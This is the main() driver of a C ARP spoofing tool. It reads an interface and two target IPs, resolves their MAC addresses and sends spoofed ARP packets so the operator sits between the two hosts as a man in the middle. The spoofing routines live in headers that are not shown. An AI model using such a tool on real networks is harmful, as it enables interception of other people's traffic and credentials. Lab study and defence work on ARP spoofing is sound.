#include "ARP_Headers.h"
#include "ARP_Sniffer.h"
#include "ARP_Packet.h"
#include "ARP_Spoofer.h"
#include "ARP_Log.h"
#include "ARP_Utils.h"

int main(int args, char* argv[])
{
    __CheckErr(args != 4, "Usage: %s <interface> <first-ip> <second-ip>", argv[0]);

    IP frst_ip;
    IP scnd_ip;
    MAC my_mac;
    struct spoofer* spoofer;
    
    get_my_mac(argv[1], my_mac);
    str_to_ip(argv[2], frst_ip);
    str_to_ip(argv[3], scnd_ip);

    LOG("\n\t\t %s <---> me (%s) <---> %s\n", argv[2], argv[1], argv[3]);

    spoofer = init_spoofing(argv[1], frst_ip, scnd_ip, my_mac);

    get_targets_mac(spoofer);

    send_spoofed_ip(spoofer);

    free_spoofer(spoofer);

    exit(EXIT_SUCCESS);
}